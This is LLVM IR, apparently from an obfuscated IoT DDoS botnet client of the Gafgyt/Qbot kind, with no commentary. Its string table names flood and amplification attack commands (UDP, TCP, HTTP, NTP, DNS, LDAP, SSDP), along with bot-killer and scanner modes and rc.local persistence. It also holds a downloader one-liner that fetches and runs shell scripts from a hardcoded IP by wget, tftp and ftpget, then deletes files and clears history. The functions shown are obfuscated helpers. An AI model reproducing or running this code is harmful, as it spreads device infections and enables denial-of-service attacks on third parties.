@.str.488 = private unnamed_addr constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00", align 1
@.str.489 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00", align 1
@.str.490 = private unnamed_addr constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00", align 1
@.str.491 = private unnamed_addr constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00", align 1
@.str.492 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00", align 1
@.str.493 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00", align 1
@.str.494 = private unnamed_addr constant [22 x i8] c"Wget/1.12 (linux-gnu)\00", align 1
@.str.495 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.496 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@.str.497 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.502 = private unnamed_addr constant [8 x i8] c"CHARGEN\00", align 1
@.str.503 = private unnamed_addr constant [40 x i8] c"cd; ./chargen %s %s chargen.txt 2 -1 %s\00", align 1
@.str.504 = private unnamed_addr constant [5 x i8] c"LDAP\00", align 1
@.str.505 = private unnamed_addr constant [34 x i8] c"cd; ./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.506 = private unnamed_addr constant [7 x i8] c"REAPER\00", align 1
@.str.507 = private unnamed_addr constant [30 x i8] c"./ldap %s %s ldap.txt 2 -1 %s\00", align 1
@.str.508 = private unnamed_addr constant [4 x i8] c"NTP\00", align 1
@.str.509 = private unnamed_addr constant [29 x i8] c"cd; ./ntp %s %s ntp.txt 2 %s\00", align 1
@.str.510 = private unnamed_addr constant [5 x i8] c"SSDP\00", align 1
@.str.511 = private unnamed_addr constant [34 x i8] c"cd; ./ssdp %s %s ssdp.txt 2 -1 %s\00", align 1
@.str.512 = private unnamed_addr constant [4 x i8] c"DNS\00", align 1
@.str.513 = private unnamed_addr constant [32 x i8] c"cd; ./dns %s %s dns.txt 2 -1 %s\00", align 1
@.str.514 = private unnamed_addr constant [4 x i8] c"TS3\00", align 1
@.str.515 = private unnamed_addr constant [44 x i8] c"cd; cd supreme; ./ts3 %s %s ts3.txt 2 -1 %s\00", align 1
@.str.516 = private unnamed_addr constant [439 x i8] c"cd /tmp || cd /var/run || cd /dev/shm || cd /mnt || cd /var;rm -f *;wget http://46.101.35.30/shitty.sh; chmod 777 shitty.sh; sh shitty.sh; tftp 46.101.35.30 -c get shtftp1.sh; chmod 777 shtftp1.sh; sh shtftp1.sh; tftp -r shtftp2.sh -g 46.101.35.30; chmod 777 shtftp2.sh; sh shtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 46.101.35.30 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf shitty.sh shtftp1.sh shtftp2.sh ftp1.sh; rm -rf *; history -c\00", align 1
@.str.517 = private unnamed_addr constant [4 x i8] c"%d\0A\00", align 1
@.str.518 = private unnamed_addr constant [6 x i8] c"TABLE\00", align 1
@.str.519 = private unnamed_addr constant [7 x i8] c"UPDATE\00", align 1
@.str.520 = private unnamed_addr constant [7 x i8] c"TELNET\00", align 1
@.str.521 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.522 = private unnamed_addr constant [21 x i8] c"HUMANS SHUTTING DOWN\00", align 1
@.str.523 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.524 = private unnamed_addr constant [47 x i8] c"\1B[0;36mHUMANS SEARCHING ON | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.525 = private unnamed_addr constant [23 x i8] c"IMAASSHOLETHATBOTKILLS\00", align 1
@.str.526 = private unnamed_addr constant [24 x i8] c"HUMANS KILLING | IP: %s\00", align 1
@.str.527 = private unnamed_addr constant [12 x i8] c"GETPUBLICIP\00", align 1
@.str.528 = private unnamed_addr constant [4 x i8] c"AMP\00", align 1
@.str.529 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.530 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.531 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.532 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.533 = private unnamed_addr constant [4 x i8] c"STD\00", align 1
@.str.534 = private unnamed_addr constant [5 x i8] c"STOP\00", align 1
@.str.535 = private unnamed_addr constant [13 x i8] c"DDOS STOPPED\00", align 1
@.str.536 = private unnamed_addr constant [16 x i8] c"NO DDOS STOPPED\00", align 1
@.str.537 = private unnamed_addr constant [7 x i8] c"HAHANO\00", align 1
@.str.538 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.539 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.540 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.541 = private unnamed_addr constant [6 x i8] c"HUMAN\00", align 1
@.str.542 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.543 = private unnamed_addr constant [19 x i8] c"/etc/rc.d/rc.local\00", align 1
@.str.544 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.545 = private unnamed_addr constant [13 x i8] c"/etc/rc.conf\00", align 1
@.str.546 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.547 = private unnamed_addr constant [8 x i8] c"\22%s%s\22\0A\00", align 1
@.str.548 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.549 = private unnamed_addr constant [13 x i8] c"fork failed\0A\00", align 1
@.str.550 = private unnamed_addr constant [44 x i8] c"\1B[0;36mNEW %s CONNECTED | IP: \1B[0;37m%s\1B[0m\00", align 1
@.str.551 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.552 = private unnamed_addr constant [4 x i8] c"DUP\00", align 1
@.str.553 = private unnamed_addr constant [20 x i8] c"PEACE OUT IMMA DUP\0A\00", align 1
@.str.554 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.555 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.556 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.557 = private unnamed_addr constant [2 x i8] c" \00", align 1

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1607742413
  %7 = add i32 %6, -1640531527
  %8 = sub i32 %7, -1607742413
  %9 = add i32 %5, -1640531527
  store i32 %8, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %10 = load i32, i32* %2, align 4
  %11 = add i32 %10, -1430012668
  %12 = add i32 %11, -1640531527
  %13 = sub i32 %12, -1430012668
  %14 = add i32 %10, -1640531527
  %15 = sub i32 0, %13
  %16 = sub i32 0, -1640531527
  %17 = add i32 %15, %16
  %18 = sub i32 0, %17
  %19 = add i32 %13, -1640531527
  store i32 %18, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %20

; <label>:20:                                     ; preds = %66, %1
  %21 = load i32, i32* %3, align 4
  %22 = icmp slt i32 %21, 4096
  br i1 %22, label %23, label %72

; <label>:23:                                     ; preds = %20
  %24 = load i32, i32* %3, align 4
  %25 = add i32 %24, 1000933488
  %26 = sub i32 %25, 3
  %27 = sub i32 %26, 1000933488
  %28 = sub nsw i32 %24, 3
  %29 = sext i32 %27 to i64
  %30 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32, i32* %3, align 4
  %33 = sub i32 0, 2
  %34 = add i32 %32, %33
  %35 = sub nsw i32 %32, 2
  %36 = sext i32 %34 to i64
  %37 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %36
  %38 = load i32, i32* %37, align 4
  %39 = xor i32 %31, -1
  %40 = and i32 %38, %39
  %41 = xor i32 %38, -1
  %42 = and i32 %31, %41
  %43 = or i32 %40, %42
  %44 = xor i32 %31, %38
  %45 = xor i32 %43, -1
  %46 = and i32 -2034676768, %45
  %47 = xor i32 -2034676768, -1
  %48 = and i32 %43, %47
  %49 = xor i32 -1640531527, -1
  %50 = and i32 %49, -2034676768
  %51 = and i32 -1640531527, %47
  %52 = or i32 %46, %48
  %53 = or i32 %50, %51
  %54 = xor i32 %52, %53
  %55 = xor i32 %43, -1640531527
  %56 = load i32, i32* %3, align 4
  %57 = xor i32 %54, -1
  %58 = and i32 %56, %57
  %59 = xor i32 %56, -1
  %60 = and i32 %54, %59
  %61 = or i32 %58, %60
  %62 = xor i32 %54, %56
  %63 = load i32, i32* %3, align 4
  %64 = sext i32 %63 to i64
  %65 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %64
  store i32 %61, i32* %65, align 4
  br label %66

; <label>:66:                                     ; preds = %23
  %67 = load i32, i32* %3, align 4
  %68 = sub i32 %67, -1838685558
  %69 = add i32 %68, 1
  %70 = add i32 %69, -1838685558
  %71 = add nsw i32 %67, 1
  store i32 %70, i32* %3, align 4
  br label %20

; <label>:72:                                     ; preds = %20
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_cmwc() #0 {
  %1 = alloca i64, align 8
  %2 = alloca i64, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  store i64 18782, i64* %2, align 8
  store i32 -2, i32* %4, align 4
  %5 = load i32, i32* @rand_cmwc.i, align 4
  %6 = sub i32 %5, 122228826
  %7 = add i32 %6, 1
  %8 = add i32 %7, 122228826
  %9 = add i32 %5, 1
  %10 = xor i32 4095, -1
  %11 = xor i32 %8, %10
  %12 = and i32 %11, %8
  %13 = and i32 %8, 4095
  store i32 %12, i32* @rand_cmwc.i, align 4
  %14 = load i64, i64* %2, align 8
  %15 = load i32, i32* @rand_cmwc.i, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = zext i32 %18 to i64
  %20 = mul i64 %14, %19
  %21 = load i32, i32* @c, align 4
  %22 = zext i32 %21 to i64
  %23 = sub i64 0, %22
  %24 = sub i64 %20, %23
  %25 = add i64 %20, %22
  store i64 %24, i64* %1, align 8
  %26 = load i64, i64* %1, align 8
  %27 = lshr i64 %26, 32
  %28 = trunc i64 %27 to i32
  store i32 %28, i32* @c, align 4
  %29 = load i64, i64* %1, align 8
  %30 = load i32, i32* @c, align 4
  %31 = zext i32 %30 to i64
  %32 = add i64 %29, 864848151573721048
  %33 = add i64 %32, %31
  %34 = sub i64 %33, 864848151573721048
  %35 = add i64 %29, %31
  %36 = trunc i64 %34 to i32
  store i32 %36, i32* %3, align 4
  %37 = load i32, i32* %3, align 4
  %38 = load i32, i32* @c, align 4
  %39 = icmp ult i32 %37, %38
  br i1 %39, label %40, label %50

; <label>:40:                                     ; preds = %0
  %41 = load i32, i32* %3, align 4
  %42 = add i32 %41, -1971803932
  %43 = add i32 %42, 1
  %44 = sub i32 %43, -1971803932
  %45 = add i32 %41, 1
  store i32 %44, i32* %3, align 4
  %46 = load i32, i32* @c, align 4
  %47 = sub i32 0, 1
  %48 = sub i32 %46, %47
  %49 = add i32 %46, 1
  store i32 %48, i32* @c, align 4
  br label %50

; <label>:50:                                     ; preds = %40, %0
  %51 = load i32, i32* %4, align 4
  %52 = load i32, i32* %3, align 4
  %53 = sub i32 %51, -1815775210
  %54 = sub i32 %53, %52
  %55 = add i32 %54, -1815775210
  %56 = sub i32 %51, %52
  %57 = load i32, i32* @rand_cmwc.i, align 4
  %58 = zext i32 %57 to i64
  %59 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %58
  store i32 %55, i32* %59, align 4
  ret i32 %55
}

; Function Attrs: noinline nounwind uwtable
define void @trim(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #10
  %8 = sub i64 0, 1
  %9 = add i64 %7, %8
  %10 = sub i64 %7, 1
  %11 = trunc i64 %9 to i32
  store i32 %11, i32* %5, align 4
  br label %12

; <label>:12:                                     ; preds = %21, %1
  %13 = load i8*, i8** %2, align 8
  %14 = load i32, i32* %4, align 4
  %15 = sext i32 %14 to i64
  %16 = getelementptr inbounds i8, i8* %13, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = sext i8 %17 to i32
  %19 = call i32 @isspace(i32 %18) #10
  %20 = icmp ne i32 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %12
  %22 = load i32, i32* %4, align 4
  %23 = add i32 %22, -1654376232
  %24 = add i32 %23, 1
  %25 = sub i32 %24, -1654376232
  %26 = add nsw i32 %22, 1
  store i32 %25, i32* %4, align 4
  br label %12

; <label>:27:                                     ; preds = %12
  br label %28

; <label>:28:                                     ; preds = %43, %27
  %29 = load i32, i32* %5, align 4
  %30 = load i32, i32* %4, align 4
  %31 = icmp sge i32 %29, %30
  br i1 %31, label %32, label %41

; <label>:32:                                     ; preds = %28
  %33 = load i8*, i8** %2, align 8
  %34 = load i32, i32* %5, align 4
  %35 = sext i32 %34 to i64
  %36 = getelementptr inbounds i8, i8* %33, i64 %35
  %37 = load i8, i8* %36, align 1
  %38 = sext i8 %37 to i32
  %39 = call i32 @isspace(i32 %38) #10
  %40 = icmp ne i32 %39, 0
  br label %41

; <label>:41:                                     ; preds = %32, %28
  %42 = phi i1 [ false, %28 ], [ %40, %32 ]
  br i1 %42, label %43, label %50

; <label>:43:                                     ; preds = %41
  %44 = load i32, i32* %5, align 4
  %45 = sub i32 0, %44
  %46 = sub i32 0, -1
  %47 = add i32 %45, %46
  %48 = sub i32 0, %47
  %49 = add nsw i32 %44, -1
  store i32 %48, i32* %5, align 4
  br label %28

; <label>:50:                                     ; preds = %41
  %51 = load i32, i32* %4, align 4
  store i32 %51, i32* %3, align 4
  br label %52

; <label>:52:                                     ; preds = %70, %50
  %53 = load i32, i32* %3, align 4
  %54 = load i32, i32* %5, align 4
  %55 = icmp sle i32 %53, %54
  br i1 %55, label %56, label %76

; <label>:56:                                     ; preds = %52
  %57 = load i8*, i8** %2, align 8
  %58 = load i32, i32* %3, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  %61 = load i8, i8* %60, align 1
  %62 = load i8*, i8** %2, align 8
  %63 = load i32, i32* %3, align 4
  %64 = load i32, i32* %4, align 4
  %65 = sub i32 0, %64
  %66 = add i32 %63, %65
  %67 = sub nsw i32 %63, %64
  %68 = sext i32 %66 to i64
  %69 = getelementptr inbounds i8, i8* %62, i64 %68
  store i8 %61, i8* %69, align 1
  br label %70

; <label>:70:                                     ; preds = %56
  %71 = load i32, i32* %3, align 4
  %72 = sub i32 %71, 841806027
  %73 = add i32 %72, 1
  %74 = add i32 %73, 841806027
  %75 = add nsw i32 %71, 1
  store i32 %74, i32* %3, align 4
  br label %52

; <label>:76:                                     ; preds = %52
  %77 = load i8*, i8** %2, align 8
  %78 = load i32, i32* %3, align 4
  %79 = load i32, i32* %4, align 4
  %80 = sub i32 0, %79
  %81 = add i32 %78, %80
  %82 = sub nsw i32 %78, %79
  %83 = sext i32 %81 to i64
  %84 = getelementptr inbounds i8, i8* %77, i64 %83
  store i8 0, i8* %84, align 1
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8*) #1

; Function Attrs: nounwind readonly
declare i32 @isspace(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @zprintf(i8*, ...) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca [1 x %struct.__va_list_tag], align 16
  store i8* %0, i8** %2, align 8
  %4 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %5 = bitcast %struct.__va_list_tag* %4 to i8*
  call void @llvm.va_start(i8* %5)
  %6 = load i8*, i8** %2, align 8
  %7 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %3, i32 0, i32 0
  %8 = call i32 @print(i8** null, i8* %6, %struct.__va_list_tag* %7)
  ret i32 %8
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #2

; Function Attrs: noinline nounwind uwtable
define internal i32 @print(i8**, i8*, %struct.__va_list_tag*) #0 {
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca %struct.__va_list_tag*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [2 x i8], align 1
  %11 = alloca i8*, align 8
  store i8** %0, i8*** %4, align 8
  store i8* %1, i8** %5, align 8
  store %struct.__va_list_tag* %2, %struct.__va_list_tag** %6, align 8
  store i32 0, i32* %9, align 4
  br label %12

; <label>:12:                                     ; preds = %331, %3
  %13 = load i8*, i8** %5, align 8
  %14 = load i8, i8* %13, align 1
  %15 = zext i8 %14 to i32
  %16 = icmp ne i32 %15, 0
  br i1 %16, label %17, label %334

; <label>:17:                                     ; preds = %12
  %18 = load i8*, i8** %5, align 8
  %19 = load i8, i8* %18, align 1
  %20 = zext i8 %19 to i32
  %21 = icmp eq i32 %20, 37
  br i1 %21, label %22, label %319

; <label>:22:                                     ; preds = %17
  %23 = load i8*, i8** %5, align 8
  %24 = getelementptr inbounds i8, i8* %23, i32 1
  store i8* %24, i8** %5, align 8
  store i32 0, i32* %8, align 4
  store i32 0, i32* %7, align 4
  %25 = load i8*, i8** %5, align 8
  %26 = load i8, i8* %25, align 1
  %27 = zext i8 %26 to i32
  %28 = icmp eq i32 %27, 0
  br i1 %28, label %29, label %30

; <label>:29:                                     ; preds = %22
  br label %334

; <label>:30:                                     ; preds = %22
  %31 = load i8*, i8** %5, align 8
  %32 = load i8, i8* %31, align 1
  %33 = zext i8 %32 to i32
  %34 = icmp eq i32 %33, 37
  br i1 %34, label %35, label %36

; <label>:35:                                     ; preds = %30
  br label %320

; <label>:36:                                     ; preds = %30
  %37 = load i8*, i8** %5, align 8
  %38 = load i8, i8* %37, align 1
  %39 = zext i8 %38 to i32
  %40 = icmp eq i32 %39, 45
  br i1 %40, label %41, label %44

; <label>:41:                                     ; preds = %36
  %42 = load i8*, i8** %5, align 8
  %43 = getelementptr inbounds i8, i8* %42, i32 1
  store i8* %43, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %44

; <label>:44:                                     ; preds = %41, %36
  br label %45

; <label>:45:                                     ; preds = %50, %44
  %46 = load i8*, i8** %5, align 8
  %47 = load i8, i8* %46, align 1
  %48 = zext i8 %47 to i32
  %49 = icmp eq i32 %48, 48
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %45
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i32 1
  store i8* %52, i8** %5, align 8
  %53 = load i32, i32* %8, align 4
  %54 = and i32 %53, 2
  %55 = xor i32 %53, 2
  %56 = or i32 %54, %55
  %57 = or i32 %53, 2
  store i32 %56, i32* %8, align 4
  br label %45

; <label>:58:                                     ; preds = %45
  br label %59

; <label>:59:                                     ; preds = %86, %58
  %60 = load i8*, i8** %5, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = icmp sge i32 %62, 48
  br i1 %63, label %64, label %69

; <label>:64:                                     ; preds = %59
  %65 = load i8*, i8** %5, align 8
  %66 = load i8, i8* %65, align 1
  %67 = zext i8 %66 to i32
  %68 = icmp sle i32 %67, 57
  br label %69

; <label>:69:                                     ; preds = %64, %59
  %70 = phi i1 [ false, %59 ], [ %68, %64 ]
  br i1 %70, label %71, label %89

; <label>:71:                                     ; preds = %69
  %72 = load i32, i32* %7, align 4
  %73 = mul nsw i32 %72, 10
  store i32 %73, i32* %7, align 4
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = sub i32 0, 48
  %78 = add i32 %76, %77
  %79 = sub nsw i32 %76, 48
  %80 = load i32, i32* %7, align 4
  %81 = sub i32 0, %80
  %82 = sub i32 0, %78
  %83 = add i32 %81, %82
  %84 = sub i32 0, %83
  %85 = add nsw i32 %80, %78
  store i32 %84, i32* %7, align 4
  br label %86

; <label>:86:                                     ; preds = %71
  %87 = load i8*, i8** %5, align 8
  %88 = getelementptr inbounds i8, i8* %87, i32 1
  store i8* %88, i8** %5, align 8
  br label %59

; <label>:89:                                     ; preds = %69
  %90 = load i8*, i8** %5, align 8
  %91 = load i8, i8* %90, align 1
  %92 = zext i8 %91 to i32
  %93 = icmp eq i32 %92, 115
  br i1 %93, label %94, label %135

; <label>:94:                                     ; preds = %89
  %95 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %96 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 0
  %97 = load i32, i32* %96, align 8
  %98 = icmp ule i32 %97, 40
  br i1 %98, label %99, label %108

; <label>:99:                                     ; preds = %94
  %100 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 3
  %101 = load i8*, i8** %100, align 8
  %102 = getelementptr i8, i8* %101, i32 %97
  %103 = bitcast i8* %102 to i32*
  %104 = add i32 %97, -1914779520
  %105 = add i32 %104, 8
  %106 = sub i32 %105, -1914779520
  %107 = add i32 %97, 8
  store i32 %106, i32* %96, align 8
  br label %113

; <label>:108:                                    ; preds = %94
  %109 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %95, i32 0, i32 2
  %110 = load i8*, i8** %109, align 8
  %111 = bitcast i8* %110 to i32*
  %112 = getelementptr i8, i8* %110, i32 8
  store i8* %112, i8** %109, align 8
  br label %113

; <label>:113:                                    ; preds = %108, %99
  %114 = phi i32* [ %103, %99 ], [ %111, %108 ]
  %115 = load i32, i32* %114, align 4
  %116 = sext i32 %115 to i64
  %117 = inttoptr i64 %116 to i8*
  store i8* %117, i8** %11, align 8
  %118 = load i8**, i8*** %4, align 8
  %119 = load i8*, i8** %11, align 8
  %120 = icmp ne i8* %119, null
  br i1 %120, label %121, label %123

; <label>:121:                                    ; preds = %113
  %122 = load i8*, i8** %11, align 8
  br label %124

; <label>:123:                                    ; preds = %113
  br label %124

; <label>:124:                                    ; preds = %123, %121
  %125 = phi i8* [ %122, %121 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.558, i32 0, i32 0), %123 ]
  %126 = load i32, i32* %7, align 4
  %127 = load i32, i32* %8, align 4
  %128 = call i32 @prints(i8** %118, i8* %125, i32 %126, i32 %127)
  %129 = load i32, i32* %9, align 4
  %130 = sub i32 0, %129
  %131 = sub i32 0, %128
  %132 = add i32 %130, %131
  %133 = sub i32 0, %132
  %134 = add nsw i32 %129, %128
  store i32 %133, i32* %9, align 4
  br label %331

; <label>:135:                                    ; preds = %89
  %136 = load i8*, i8** %5, align 8
  %137 = load i8, i8* %136, align 1
  %138 = zext i8 %137 to i32
  %139 = icmp eq i32 %138, 100
  br i1 %139, label %140, label %172

; <label>:140:                                    ; preds = %135
  %141 = load i8**, i8*** %4, align 8
  %142 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %143 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 0
  %144 = load i32, i32* %143, align 8
  %145 = icmp ule i32 %144, 40
  br i1 %145, label %146, label %156

; <label>:146:                                    ; preds = %140
  %147 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 3
  %148 = load i8*, i8** %147, align 8
  %149 = getelementptr i8, i8* %148, i32 %144
  %150 = bitcast i8* %149 to i32*
  %151 = sub i32 0, %144
  %152 = sub i32 0, 8
  %153 = add i32 %151, %152
  %154 = sub i32 0, %153
  %155 = add i32 %144, 8
  store i32 %154, i32* %143, align 8
  br label %161

; <label>:156:                                    ; preds = %140
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %142, i32 0, i32 2
  %158 = load i8*, i8** %157, align 8
  %159 = bitcast i8* %158 to i32*
  %160 = getelementptr i8, i8* %158, i32 8
  store i8* %160, i8** %157, align 8
  br label %161

; <label>:161:                                    ; preds = %156, %146
  %162 = phi i32* [ %150, %146 ], [ %159, %156 ]
  %163 = load i32, i32* %162, align 4
  %164 = load i32, i32* %7, align 4
  %165 = load i32, i32* %8, align 4
  %166 = call i32 @printi(i8** %141, i32 %163, i32 10, i32 1, i32 %164, i32 %165, i32 97)
  %167 = load i32, i32* %9, align 4
  %168 = sub i32 %167, 2057175227
  %169 = add i32 %168, %166
  %170 = add i32 %169, 2057175227
  %171 = add nsw i32 %167, %166
  store i32 %170, i32* %9, align 4
  br label %331

; <label>:172:                                    ; preds = %135
  %173 = load i8*, i8** %5, align 8
  %174 = load i8, i8* %173, align 1
  %175 = zext i8 %174 to i32
  %176 = icmp eq i32 %175, 120
  br i1 %176, label %177, label %208

; <label>:177:                                    ; preds = %172
  %178 = load i8**, i8*** %4, align 8
  %179 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %180 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %179, i32 0, i32 0
  %181 = load i32, i32* %180, align 8
  %182 = icmp ule i32 %181, 40
  br i1 %182, label %183, label %192

; <label>:183:                                    ; preds = %177
  %184 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %179, i32 0, i32 3
  %185 = load i8*, i8** %184, align 8
  %186 = getelementptr i8, i8* %185, i32 %181
  %187 = bitcast i8* %186 to i32*
  %188 = add i32 %181, 672214137
  %189 = add i32 %188, 8
  %190 = sub i32 %189, 672214137
  %191 = add i32 %181, 8
  store i32 %190, i32* %180, align 8
  br label %197

; <label>:192:                                    ; preds = %177
  %193 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %179, i32 0, i32 2
  %194 = load i8*, i8** %193, align 8
  %195 = bitcast i8* %194 to i32*
  %196 = getelementptr i8, i8* %194, i32 8
  store i8* %196, i8** %193, align 8
  br label %197

; <label>:197:                                    ; preds = %192, %183
  %198 = phi i32* [ %187, %183 ], [ %195, %192 ]
  %199 = load i32, i32* %198, align 4
  %200 = load i32, i32* %7, align 4
  %201 = load i32, i32* %8, align 4
  %202 = call i32 @printi(i8** %178, i32 %199, i32 16, i32 0, i32 %200, i32 %201, i32 97)
  %203 = load i32, i32* %9, align 4
  %204 = add i32 %203, -1464898665
  %205 = add i32 %204, %202
  %206 = sub i32 %205, -1464898665
  %207 = add nsw i32 %203, %202
  store i32 %206, i32* %9, align 4
  br label %331

; <label>:208:                                    ; preds = %172
  %209 = load i8*, i8** %5, align 8
  %210 = load i8, i8* %209, align 1
  %211 = zext i8 %210 to i32
  %212 = icmp eq i32 %211, 88
  br i1 %212, label %213, label %244

; <label>:213:                                    ; preds = %208
  %214 = load i8**, i8*** %4, align 8
  %215 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %216 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 0
  %217 = load i32, i32* %216, align 8
  %218 = icmp ule i32 %217, 40
  br i1 %218, label %219, label %227

; <label>:219:                                    ; preds = %213
  %220 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 3
  %221 = load i8*, i8** %220, align 8
  %222 = getelementptr i8, i8* %221, i32 %217
  %223 = bitcast i8* %222 to i32*
  %224 = sub i32 0, 8
  %225 = sub i32 %217, %224
  %226 = add i32 %217, 8
  store i32 %225, i32* %216, align 8
  br label %232

; <label>:227:                                    ; preds = %213
  %228 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %215, i32 0, i32 2
  %229 = load i8*, i8** %228, align 8
  %230 = bitcast i8* %229 to i32*
  %231 = getelementptr i8, i8* %229, i32 8
  store i8* %231, i8** %228, align 8
  br label %232

; <label>:232:                                    ; preds = %227, %219
  %233 = phi i32* [ %223, %219 ], [ %230, %227 ]
  %234 = load i32, i32* %233, align 4
  %235 = load i32, i32* %7, align 4
  %236 = load i32, i32* %8, align 4
  %237 = call i32 @printi(i8** %214, i32 %234, i32 16, i32 0, i32 %235, i32 %236, i32 65)
  %238 = load i32, i32* %9, align 4
  %239 = sub i32 0, %238
